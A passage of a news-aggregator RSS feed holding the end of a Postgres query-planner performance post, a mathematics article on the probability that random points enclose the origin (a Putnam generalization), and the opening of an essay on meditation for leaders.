the appropriate values of every row found are used as hash keys to locate the matching rows in the table.”</li></ol><p id="8865">For our purposes, the main thing to note here is that the advantage of a Nested Loop Join is that there’s very little overhead compared to the other join strategies. However, this join can go wrong if there are many rows in the left relation. For example, suppose there are 1,000 rows in the left relation and Postgres is using an index to access the right relation. If each index access takes 4ms, the entire join will take 4s, which is too slow in the context of responding to a user request.</p><p id="c5b5">Now that we understand the different type of joins, let’s revisit the Nested Loop Join that struck us as problematic. Without going into too much detail about our data model at Affinity, all you need to know is that on our tables <code>entity_values</code> and <code>lists_entries</code>, the column <code>org_id</code> is uniquely determined by <code>list_id</code> or <code>entity_attribute_id</code>, meaning that in order to estimate the selectivity of a set of filters on these columns, the filters should not be considered individually. <strong>Our slow queries were the result of Postgres underestimating the number of rows that would result from applying a filter condition and opting to use a nested loop join because of that underestimation.</strong></p><h2 id="4244">Actions Taken</h2><p id="edb4">Let’s look back at our original problem query. By far, the most costly step was looping over the index access to <code>entity_values_org_id_entity_attribute_id_company_id_index</code> a whopping 13,769 times.</p><p id="f8ca">To encourage the planner to use a different join strategy, we needed to improve its estimates for filters on <code>lists_entries</code> and <code>entity_values</code>. Based on the filters applied, we maxed out the per-column statistics for:</p><pre><span id="099f">lists_entries:<br>- org_id<br>- list_id</span><span id="cee2">entity_values:<br>- org_id<br>- entity_attribute_id</span></pre><p id="3c24">among other tables and columns for different query patterns.</p><p id="5f14">We also added dependency statistics on:</p><pre><span id="8495">lists_entries (list_id, org_id)<br>entity_values (entity_attribute_id, org_id)</span></pre><p id="5a2b">among other dependency statistics for other tables and columns, since both <code>list_id</code> and <code>entity_attribute_id</code> uniquely determine the <code>org_id</code>.</p><p id="c28c">After we made these adjustments, Postgres chose the following query plan for our original query:</p><figure><div></div></figure><p id="3a3d">Here, the estimates are much more accurate and the planner opted for a hash join for the inner join — and the query took 42 milliseconds instead of the original 2 minutes.</p><p id="54b4">Increasing the per-column statistics and adding dependency statistics have helped tremendously, but there is still progress to be made. As you may have noticed in the improved query plan, the planner underestimates the number of rows resulting from the inner join. While the outer nested loop join didn’t take long this time, it’s not hard to imagine a query where the inner join results in many rows and the outer join becomes a bottleneck.</p><p id="f2fd">We hope this post has given you some ideas about how to improve your query plans, or at the very least taught you something about the magic of Postgres!</p></div></div></section></div></div>]]>
            </description>
            <link>https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070742</guid>
            <pubDate>Thu, 12 Nov 2020 15:17:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Capturing the Origin with Random Points: Generalizations of a Putnam Problem]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070681">thread link</a>) | @Flamingo94
<br/>
November 12, 2020 | https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm | <a href="https://web.archive.org/web/*/https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><center>
<p>
<i>College Mathematics Journal</i>, <b>27</b> (1996) no. 3,
186-192.
</p>
<p>
<p>Copyright<br><b><i>The Mathematical Association of
America</i></b></p>
</p>
</center>
<hr>


<p>

<title> Capturing the Origin with Random Points:  Generalizations of a 
Putnam Problem</title>
 
</p>

<center>Ralph Howard <br>
Department of Mathematics <br>
University of South Carolina <br>
Columbia SC 29208 <p>
&nbsp;
and </p><p>
&nbsp;
Paul Sisson <br>
Department of Mathematics <br>
LSU - Shreveport <br>
Shreveport LA 71115
</p></center>
<h2><a name="tth_sEc1">
1</a>&nbsp;&nbsp;Introduction</h2>

<p>
Problem A-6 of the 53<sup>rd</sup> Putnam Competition read as follows:

</p><blockquote>Four points are chosen at random on the surface of a sphere.  What is the 
probability that the center of the sphere lies inside the tetrahedron whose 
vertices are at the four points?  (It is understood that each point is 
independently chosen relative to a uniform distribution on the sphere.)
</blockquote>
<p>
The problem has a geometric immediacy that makes it tantalizing:  the 
tetrahedron so formed is readily visualized and no great mathematical 
background is necessary to understand the question being asked.  Further, it 
is almost impossible to resist the urge to generalize the problem.  Some of 
the variants that spring to mind quickly are:

</p><dl compact="">   <dt><b>(1)</b></dt>
	<dd> Suppose <i>n</i>+1 points are chosen at random from the surface of 
   a ball in  <b><i>R</i></b><sup><i>n</i></sup>.  What is the probability that the center of the 
   ball lies inside the simplex in  <b><i>R</i></b><sup><i>n</i></sup> whose vertices are the <i>n</i>+1 
   points (i.e. the <i>convex hull </i> of the <i>n</i>+1 points)?
   
</dd><dt><b>(2)</b></dt>
	<dd> Four points are chosen at random from <i>within </i> a ball in
    <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from an <i>n</i>-ball in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the
   probability that the center of the ball lies within the convex hull of
   the points?
   
</dd><dt><b>(3)</b></dt>
	<dd> Four points are chosen at random from the surface of some <i>
   other </i> object in  <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from the surface of some
   object in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the probability that a fixed interior point
   of the object lies inside the convex hull of the four (respectively,
   <i>n</i>+1) points?
   
</dd><dt><b>(4)</b></dt>
	<dd> More vaguely, assume the action is centered about the origin 
   in  <b><i>R</i></b><sup><i>n</i></sup>, and that <i>n</i>+1 points are chosen ``at random'' in  <b><i>R</i></b><sup><i>n</i></sup>.  
   What is the probability that the convex hull of the <i>n</i>+1 points 
   contains the origin?
   
</dd></dl>The list can easily be extended, but as question <b>(4)</b> demonstrates we
have already reached the point where the questions need to be more
carefully posed.

<p>
Despite the fact that the original Putnam question is so easily understood,
the solution is (not surprisingly) not arrived at with equal ease.  This
sentiment is supported by the fact that 123 of the top 203 scorers on the
Putnam exam submitted no solution at all to problem A-6, and a relatively
low number of 9 of the top scorers received a full 10 points for the
problem. This difficulty in answering such an easily grasped problem just 
makes it more intriguing, of course, and suggests that the problem and its 
generalizations are worth investigating.  In this paper we will develop a 
surprisingly simple answer to questions <b>(1)</b> and <b>(2)</b>.  In addition, 
our result answers rather general forms of questions <b>(3)</b> and <b>(4)</b>.

</p><p>
In [<a href="#klos" name="CITEklos">3</a>], Klosinski, Alexanderson and Larson offer the following
solution to A-6.  Assume the sphere is centered at the origin, and that
the first point <i>P</i><sub>0</sub> is located at the north pole of the sphere, with the
three remaining points then located at random locations on the sphere.  We
can assume that these remaining points are chosen in a two-step process:
first a diameter <i>P</i><sub><i>i</i>1</sub><i>P</i><sub><i>i</i>2</sub> (<i>i</i> <span face="symbol">Î</span> {1,2,3}) is fixed and then one of
the two end-points {<i>P</i><sub><i>i</i>1</sub>,<i>P</i><sub><i>i</i>2</sub>} is selected as a vertex of the
tetrahedron.  Figure 1 below illustrates a typical orientation of the  
choices.  The eight possible tetrahedra <i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub>
(with each <i>j</i><sub><i>i</i></sub> being 1 or 2) are equally likely.  Further, we can assume
that the result is an honest tetrahedron and that the origin does not lie 
on any face.  (Recall that the plane through three noncollinear points 
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub> consists of all <i>affine combinations </i> 

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">a</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>3</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3</span>&nbsp;<br></td><td nowrap="">
,</td></tr></tbody></table>
</div></center>

 
where 
<span face="symbol">a</span><sub>1</sub>+<span face="symbol">a</span><sub>2</sub>+<span face="symbol">a</span><sub>3</sub> = 1.  With probability one, neither the fourth 
vertex nor the origin lies in the plane through any three vertices.)

<center><img src="https://lsusmath.rickmabry.org/psisson/putnam/one.gif" width="300" height="300"></center>
 
<center>Figure 1: Typical choice of vertices.</center>
 
<p>
In particular, the four vertex vectors 

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
&nbsp;and&nbsp; </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
must be linearly dependent, so there exists a 4-tuple
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>) for which 

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


and for which <i>w</i>,<i>x</i>,<i>y</i> and <i>z</i> are all non-zero.  Then since 

<center></center>

 
the eight equations

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


have the solutions

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>),(<i>w</i>,<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,<i>z</i>),</p></td>
</tr><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,-<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,-<i>z</i>).</p></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Each point in the tetrahedron with vertices <i>P</i><sub>0</sub>, <i>P</i><sub>1<i>j</i><sub>1</sub></sub>, <i>P</i><sub>2<i>j</i><sub>2</sub></sub>,<i>P</i><sub>3<i>j</i><sub>3</sub></sub> can be uniquely represented as a <i>convex combination </i>

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">b</span><sub>0</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>3</sub></td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
(where each <span face="symbol">b</span><sub><i>i</i></sub>  <span face="symbol">³</span> 0 and <span face="symbol">b</span><sub>0</sub> + <span face="symbol">b</span><sub>1</sub> + <span face="symbol">b</span><sub>2</sub> +<span face="symbol">b</span><sub>3</sub> = 1), so the origin is contained in the tetrahedron
<i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub> if and only if the 4-tuple solving the
associated vector equation

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


consists of four coordinates of the same sign.  Since only one of the 
above eight solutions has this property, only one of the eight equally 
likely tetrahedra contains the origin, and hence the probability that the 
origin is contained in the randomly chosen tetrahedron is 1/8.

<h2><a name="tth_sEc2">
2</a>&nbsp;&nbsp;First Generalization</h2>

<p>
So far, so good.  This solution generalizes in the obvious way and gives us
the answer of 1/2<sup><i>n</i></sup> to question <b>(1)</b> in the above list.  But what of
question <b>(2)</b>?  The above approach seems inadequate in this case, since
points can now be chosen anywhere along the randomly chosen diameters.  

</p><p>
Let us employ one of the standard procedures when faced with a difficult
problem:  that of changing the problem to something easier.  We will
attempt first to answer question <b>(2)</b> in  <b><i>R</i></b><sup>2</sup>.  Specifically, if three
points are chosen at random from the unit disk <i>B</i><sup>2</sup>, what is the
probability that the triangle thus formed contains the origin? Let us
further simplify the problem by assuming that we are choosing three points
at random with respect to a probability measure <i>P</i> on <i>B</i><sup>2</sup> which is <i>
rotationally invariant </i>;  that is, measures of subsets of <i>B</i><sup>2</sup> are
unchanged under rotational translations.  We will also continue to assume
the appropriate degree of non-degeneracy of the measure (more on this in
the next section).

</p><p>
Since we are assuming rotational invariance, we can assume that the first
point <i>P</i><sub>1</sub> is fixed between 0 and 1 on the positive <i>x</i>-axis.  With
probability one, the second point <i>P</i><sub>2</sub> of the triangle is not located at
the origin, and we can form the ray starting at the origin and passing
through <i>P</i><sub>2</sub>.  Let <span face="symbol">q</span> be the angle between the positive <i>x</i>-axis and
this ray.  The question can now be posed as a conditional probability
problem:  given <span face="symbol">q</span>, what is the probability that the third point
<i>P</i><sub>3</sub> defines a triangle which contains the origin? Integrating this
probability over all possible <span face="symbol">q</span>'s will then give us the answer we
seek.

</p><p>
In order to simplify our work, let us agree upon some notation.  Given a
point <i>P</i> in <i>B</i><sup>2</sup> -{(0,0)}, let <span face="symbol">Q</span>(<i>P</i>) denote the angle from the
positive <i>x</i>-axis to the ray beginning at the origin and passing through
<i>P</i> (see Figure 2).  Thus, <span face="symbol">q</span><sub>1</sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i>)  <span face="symbol">£</span> <span face="symbol">q</span><sub>2</sub> will
indicate that <i>P</i> lies in the sector of <i>B</i><sup>2</sup> defined by the angles
<span face="symbol">q</span><sub>1</sub> and <span face="symbol">q</span><sub>2</sub>.  Let <i>P</i>(capture) denote the probability
that the origin is captured within the triangle formed by the three points
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub>.  Thus, the first task is to calculate
<i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>), for each <span face="symbol">q</span> <span face="symbol">Î</span> [0,2<span face="symbol">p</span>].

</p><center><img src="https://lsusmath.rickmabry.org/psisson/putnam/two.gif" width="300" height="300"></center>
 
<center>Figure 2: Illustration of <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) for a typical <i>P</i><sub>2</sub>.</center>
 
<p>
Suppose first that 0  <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> <span face="symbol">p</span>.  It is not difficult to see that
a necessary and sufficient condition for capture is that <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>3</sub>)  <span face="symbol">£</span> <span face="symbol">p</span>+ <span face="symbol">q</span>.  That is, the ray from the origin to <i>P</i><sub>3</sub>
must pass through <i>S</i><sup>1</sup> (the boundary of <i>B</i><sup>2</sup>) at a point between <span face="symbol">p</span>
units and <span face="symbol">p</span>+ <span face="symbol">q</span> units, as measured from the positive <i>x</i>-axis.
Since the length of this arc is <span face="symbol">q</span>, this conditional probability is
<span face="symbol">q</span>/2<span face="symbol">p</span>, i.e. <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = <span face="symbol">q</span>/2<span face="symbol">p</span>.  Similarly, if <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> 2<span face="symbol">p</span>, <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = 1 - <span face="symbol">q</span>/2<span face="symbol">p</span>.

</p><p>
We can now approximate our solution with an appropriate Riemann sum.  Let 
{ <span face="symbol">q</span><sub>0</sub>, <span face="symbol">¼</span>, <span face="symbol">q</span><sub><i>n</i></sub> } be a partition of [0,2<span face="symbol">p</span>].  Then

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 <span face="symbol">»</span> </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;<i>P</i>(<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>)  </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;</td><td nowrap="">
<span face="symbol">D</span><span face="symbol">q</span><sub><i>i</i></sub><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
.</td></tr></tbody></table></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
In the limit of finer and finer partitions, we obtain

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) &nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1"><span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
</td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
&nbsp; </td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
+ </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1"><span face="symbol">p</span></span>&nbsp;<br></td><td nowrap="">
</td><td><span face="symbol">
æ<br>ç<br>
è
</span></td><td nowrap="">
1 - </td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td><span face="symbol">
ö<br>÷<br>
ø
</span></td><td nowrap="">
&nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Examination of this argument shows that we have answered more than we set
out to, since the fact that <i>P</i> is a probability measure on <i>B</i><sup>2</sup> is really
irrelevant.  As long as <i>P</i> is a probability measure on  <b><i>R</i></b><sup>2</sup> which is
rotationally invariant and suitably non-degenerate, the result is the same.
We are already aware of one consequence of this:  if <i>P</i> is a uniformly
distributed probability measure on <i>S</i><sup>1</sup>, the method of Klosinski,
Alexanderson and Larson tells us that with probability 1/4 the origin
will be contained in a randomly chosen triangle.  We can also begin to make
sense of question <b>(4)</b> by noting that if <i>P</i> is the usual Gaussian
probability measure on all of  <b><i>R</i></b><sup>2</sup>, the probability that three randomly
chosen points captures the origin is again 1/4.

</p><p>
A related problem in geometric probability, whose many variants are dealt
with in [<a href="#hall" name="CITEhall">1</a>], [<a href="#kendalls" name="CITEkendalls">2</a>], [<a href="#lang1" name="CITElang1">4</a>], [<a href="#lang2" name="CITElang2">5</a>] and
[<a href="#san" name="CITEsan">6</a>], is to find the probability that three points chosen at random
from a region in the plane will form an acute triangle.  One version can be
easily answered here.  Since the origin is captured by three points chosen
at random from the unit circle if and only if the three points form an
acute triangle, the probability that an acute triangle is formed by three
points chosen at random from <i>S</i><sup>1</sup> is also 1/4.

</p><p>
The results above suggest that under rather general circumstances <i>n</i>+1
points chosen randomly from a region in  <b><i>R</i></b><sup><i>n</i></sup> which is symmetric with
respect to the origin will capture the origin with probability 1/2<sup><i>n</i></sup>. Our
main result gives conditions which guarantee the …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</a></em></p>]]>
            </description>
            <link>https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070681</guid>
            <pubDate>Thu, 12 Nov 2020 15:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For leaders, meditation is more useful than business school]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070677">thread link</a>) | @lzybes
<br/>
November 12, 2020 | https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school | <a href="https://web.archive.org/web/*/https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Meditation makes people better leaders, and when done consistently can be more effective than any knowledge on leadership one could acquire. Hard stop.</p>
<!--more-->
<p>If you are in a leadership position, nearly all acquired knowledge (including any degree on which you spent many tens of thousands of dollars) is obsolete the moment it’s acquired, given the pace of change today. By definition, leadership involves facing and navigating ambiguity and change and helping others to do the same, a task at which acquired knowledge, or even practice,<span>&nbsp;</span><a href="https://www.businessinsider.com/new-study-destroys-malcolm-gladwells-10000-rule-2014-7" rel="noopener" target="_blank">produces outcomes only about 1% better than doing nothing at all</a>. As Naval Ravikant, founder of AngelList, prolific angel investor and Twitter philosopher says, “<a href="https://twitter.com/naval/status/1002103360646823936" rel="noopener" target="_blank">there’s no skill called ‘business’</a>” that you can learn.</p>
<p>Much better, then, to develop your ability to navigate change and uncertainty. Better to hone your ability to make good decisions, free from unconscious bias, and invest in your ability to connect with, understand, and lead your people. These are the traits of a successful leader today.</p>
<p>Those are also the results one can expect of meditation.</p>
<div><p><img src="https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=1489&amp;name=meditation.png" alt="meditation" width="1489" srcset="https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=745&amp;name=meditation.png 745w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=1489&amp;name=meditation.png 1489w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=2234&amp;name=meditation.png 2234w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=2978&amp;name=meditation.png 2978w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=3723&amp;name=meditation.png 3723w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=4467&amp;name=meditation.png 4467w" sizes="(max-width: 1489px) 100vw, 1489px"></p></div>
<h2>Three offerings of meditation</h2>
<p>Leaders are often driven by attaining goals—by success. This makes meditation hard to navigate for some at first because, by its nature, meditation is about letting go. Any amount of chasing “good meditation” will only bring you farther away from the remarkable benefits that it can bring.</p>
<p>That said, if you haven’t already developed a practice and are wondering why anyone would invest in “sitting quietly not doing much” rather than checking another email off the list or attending leadership classes, allow me to suggest that <strong>one would choose meditation if one wanted to strengthen the following three attributes:&nbsp;Concentration. Equanimity. Insight.</strong></p>
<h3><strong>Concentration:</strong></h3>
<p><em>— the action or power of focusing one’s attention or mental effort</em></p>
<p>It seems like anyone should be able to focus on something for a minute, without getting distracted by thought. It’s only a minute, right?</p>
<p>Neuroscientist Sam Harris offers an experiment, to test this:</p>
<blockquote>
<p><strong>See if you can stop thinking for the next 60 seconds. &nbsp;You can notice your breath, or listen to the birds, but do not let your attention be carried away by thought,&nbsp;<em>any thought</em>, even for an instant. &nbsp; Some of you will be so distracted by thought as to imagine that you succeeded. &nbsp;In fact, beginning meditators often think that they are able to concentrate on a single object, such as the breath, for minutes at a time, only to report after days or weeks of intensive practice that their attention is now carried away by thought every few seconds. &nbsp;This is actually progress. &nbsp;It takes a certain degree of concentration to even notice how distracted you are. &nbsp;Even if your life depended on it, you could not spend a full minute free of thought.</strong></p>
</blockquote>
<p>Meditation is, in essence, practicing focusing. Whether the object of meditation is the breath, a mantra, or even if you’re practicing objectless meditation like Shikantaza, you’re directly flexing your concentration muscle. And like any muscle, over time it gets get stronger.</p>
<p>Leadership is distracting, by nature. Between status updates with team members, strategy sessions, business development, fire dousing and the rest, most leaders can’t afford much time to dive deep into focused time, regardless of how important they know it to be (hint: it’s not just leaders). Being distracted and “busy” has become so ingrained in our culture that we glorify<span>&nbsp;</span><a href="https://health.clevelandclinic.org/science-clear-multitasking-doesnt-work/" rel="noopener" target="_blank">fundamentally impossible things like multitasking</a>. But that really only serves as an emotional justification for our painful inability to focus.</p>
<p>The reality is, to make progress in anything requires focus, and the more consecutive moments of focus you can muster on a single item, the quicker progress happens. Particularly in leadership, when you must dive into a situation, focus, and then jump out quickly before diving back into another situation, the ability to focus deeply on a problem or situation at will without getting distracted is critical.</p>
<div><p>You may not make it a minute, but meditation is the most direct way to ratchet up your Concentration stamina.</p></div>
<h3><strong>Equanimity:</strong></h3>
